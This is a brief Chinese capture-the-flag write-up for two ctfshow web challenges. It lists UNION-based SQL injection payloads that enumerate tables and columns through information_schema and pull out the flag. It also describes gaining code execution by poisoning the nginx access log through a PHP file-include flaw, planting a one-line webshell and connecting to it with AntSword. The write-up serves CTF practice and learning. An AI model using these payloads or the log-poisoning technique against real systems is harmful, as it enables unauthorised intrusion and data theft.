以下题目来自ctfshow
# web2 #
very ez sql
直接拿下面的wp去给ai看，给的解释很详细，全部熟练了sql就入门了
```
username=a' or '1' order by 3#&password=password username=a' or '1' union select 1,2,3#&password=password 

a' or '1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()# 

a' or '1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#

 a' or '1' union select 1,group_concat(flag),3 from flag#
```

建议自己再去了解一下sql,以及其他的注入，sql是最常规的

其实有了注释符\#就不用password了

# web4 #
懒得截图，整个界面就是一个
```
<?php include($_GET['url']);?>
```
注意到服务器类型是nginx,那么?url=/var/log/nginx/access.log,

发现有访问日志的请求头储存，bp抓包改请求头为一句话木马

放包以后没回显，说明执行成功，蚁剑链接就行